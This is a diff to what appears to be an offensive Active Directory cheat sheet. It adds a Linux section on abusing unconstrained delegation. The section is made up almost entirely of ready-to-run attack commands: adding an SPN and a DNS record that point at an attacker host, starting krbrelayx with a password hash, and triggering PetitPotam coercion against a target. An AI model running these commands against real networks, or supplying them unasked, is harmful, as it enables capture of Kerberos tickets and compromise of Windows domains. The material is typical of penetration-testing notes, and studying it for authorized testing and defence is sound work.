@@ -84,3 +84,21 @@ Since the principal is in Unconstrained Delegation, when the machine account wil
 ##### Trigger the coercion
 
     .\PetitPotam.exe <attacker_ip> <target_IP>
+
+# Linux
+
+##### Add the SPN
+
+    python3 addspn.py -u 'domain.local\user1' -p 'password' -s 'HOST/attacker.domain.local' -t 'target.domain.local' --additional <DC_IP>
+
+##### Create the DNS record
+
+    python3 dnstool.py -u 'domain.local\user1' -p 'password' -r 'attacker.domain.local' -d '<attacker_IP>' --action add <DC_IP>
+
+##### Run krbrelayx with the hash of the password of the principal
+
+    python3 krbrelayx.py -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -dc-ip dc.domain.local
+
+##### Trigger the coercion
+
+    ./petitpotam.py -u user1 -p password -d domain.local -pipe all "attacker.domain.local" <target_IP>
